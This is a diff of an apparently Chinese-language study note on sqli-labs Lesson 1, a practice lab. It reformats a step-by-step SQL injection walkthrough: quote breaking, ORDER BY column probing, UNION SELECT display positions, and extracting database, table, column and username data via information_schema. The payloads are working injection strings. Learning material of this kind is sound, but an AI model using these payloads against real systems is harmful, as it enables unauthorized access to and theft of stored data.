@@ -253,47 +253,63 @@ password<span class="pl-k">=</span>anypassword</pre></div>
 <p>sqli-labs Lesson 1</p>
 <ol>
 <li>‌正常输入（id=1）‌<br>
-‌原SQL语句‌：SELECT * FROM users WHERE id='1';<br>
-‌原理‌：输入1被包裹在单引号内，语法正确，正常执行。</li>
-<li>‌异常输入（id=1'）‌<br>
-‌原SQL语句‌：SELECT * FROM users WHERE id='1'';<br>
-‌报错原因‌：单引号未闭合，导致语法错误（id='1'后多出一个单引号）。<br>
-‌攻击意义‌：通过错误信息确认存在注入点。</li>
-<li>‌注释修复（id=1' --+）‌<br>
-‌原SQL语句‌：SELECT * FROM users WHERE id='1' --+ ';<br>
-‌原理‌：<br>
---+是SQL注释符（--），+被URL编码为空格。<br>
-注释掉后续字符（包括原语句的';），修复语法错误。<br>
-‌攻击意义‌：确认注入可行性。</li>
+‌- 原SQL语句‌：SELECT * FROM users WHERE id='1';<br>
+‌- 原理‌：输入1被包裹在单引号内，语法正确，正常执行。</li>
+<li>‌ 异常输入（id=1'）‌<br>
+‌- 原SQL语句‌：SELECT * FROM users WHERE id='1'';<br>
+‌- 报错原因‌：单引号未闭合，导致语法错误（id='1'后多出一个单引号）。</li>
+</ol>
+<ul>
+<li>攻击意义‌：通过错误信息确认存在注入点。</li>
+</ul>
+<ol start="3">
+<li>‌ 注释修复（id=1' --+）‌<br>
+‌- 原SQL语句‌：SELECT * FROM users WHERE id='1' --+ ';</li>
+</ol>
+<ul>
+<li>原理‌：--+是SQL注释符（--），+被URL编码为空格。注释掉后续字符（包括原语句的';），修复语法错误。<br>
+‌- 攻击意义‌：确认注入可行性。</li>
+</ul>
+<ol start="4">
 <li>‌探测列数（id=1' ORDER BY N --+）‌<br>
-‌示例‌：id=1' ORDER BY 10 --+<br>
-‌原SQL语句‌：SELECT * FROM users WHERE id='1' ORDER BY 10 -- ';<br>
-‌原理‌：<br>
-若原查询列数小于N，报错；反之正常。<br>
-逐步调整N（如10→5→3）确定列数。<br>
-‌攻击意义‌：为后续UNION查询做准备。</li>
-<li>‌联合查询（id=-1' UNION SELECT 1,2,3 --+）‌<br>
-‌示例‌：id=-1' UNION SELECT 1,2,3 --+<br>
-‌原SQL语句‌：SELECT * FROM users WHERE id='-1' UNION SELECT 1,2,3 -- ';<br>
-‌原理‌：<br>
-id=-1确保原查询无结果，使页面显示UNION后的数据。<br>
-页面显示2或3，表示该位置可回显数据。<br>
-‌攻击意义‌：确定回显位，用于泄露信息。</li>
-<li>‌泄露数据库名（id=-1' UNION SELECT 1,database(),3 --+）‌<br>
-‌原SQL语句‌：SELECT ... UNION SELECT 1,database(),3 -- ';<br>
-‌原理‌：database()返回当前数据库名（如security），显示在回显位。</li>
-<li>‌泄露表名（id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) ...),3 --+）‌<br>
-‌示例‌：SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security'<br>
-‌原理‌：<br>
-information_schema.tables存储所有表信息。<br>
-GROUP_CONCAT()将多行结果合并为字符串（如users,emails）。<br>
-‌攻击意义‌：获取目标表名（如users）。</li>
-<li>‌泄露列名（id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) ...),3 --+）‌<br>
-‌示例‌：SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'<br>
-‌原理‌：从information_schema.columns获取列名（如id,username,password）。</li>
-<li>‌窃取数据（id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(username) FROM users),3 --+）‌<br>
-‌示例‌：SELECT GROUP_CONCAT(username) FROM users<br>
-‌原理‌：直接查询users表的username列，数据回显到页面。</li>
+‌- 示例‌：id=1' ORDER BY 10 --+<br>
+‌- 原SQL语句‌：SELECT * FROM users WHERE id='1' ORDER BY 10 -- ';<br>
+‌- 原理‌：若原查询列数小于N，报错；反之正常。逐步调整N（如10→5→3）确定列数。<br>
+‌- 攻击意义‌：为后续UNION查询做准备。</li>
+<li>‌ 联合查询（id=-1' UNION SELECT 1,2,3 --+）‌</li>
+</ol>
+<ul>
+<li>示例‌：id=-1' UNION SELECT 1,2,3 --+<br>
+‌- 原SQL语句‌：SELECT * FROM users WHERE id='-1' UNION SELECT 1,2,3 -- ';<br>
+‌- 原理‌：id=-1确保原查询无结果，使页面显示UNION后的数据。页面显示2或3，表示该位置可回显数据。</li>
+<li>攻击意义‌：确定回显位，用于泄露信息。</li>
+</ul>
+<ol start="6">
+<li>‌ 泄露数据库名（id=-1' UNION SELECT 1,database(),3 --+）‌<br>
+‌- 原SQL语句‌：SELECT ... UNION SELECT 1,database(),3 -- ';</li>
+</ol>
+<ul>
+<li>原理‌：database()返回当前数据库名（如security），显示在回显位。</li>
+</ul>
+<ol start="7">
+<li>‌ 泄露表名（id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) ...),3 --+）‌</li>
+</ol>
+<ul>
+<li>示例‌：SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security'<br>
+‌- 原理‌：information_schema.tables存储所有表信息。GROUP_CONCAT()将多行结果合并为字符串（如users,emails）。</li>
+<li>攻击意义‌：获取目标表名（如users）。</li>
+</ul>
+<ol start="8">
+<li>‌ 泄露列名（id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) ...),3 --+）‌</li>
+</ol>
+<ul>
+<li>示例‌：SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'</li>
+<li>原理‌：从information_schema.columns获取列名（如id,username,password）。</li>
+</ul>
+<ol start="9">
+<li>‌ 窃取数据（id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(username) FROM users),3 --+）‌<br>
+‌- 示例‌：SELECT GROUP_CONCAT(username) FROM users<br>
+‌- 原理‌：直接查询users表的username列，数据回显到页面。</li>
 </ol>
 <div class="highlight highlight-source-sql"><pre class="notranslate">?id<span class="pl-k">=</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> --+</span>
 <span class="pl-s">select * form users where id=1<span class="pl-pds">'</span></span> <span class="pl-c"><span class="pl-c">--</span>   </span>
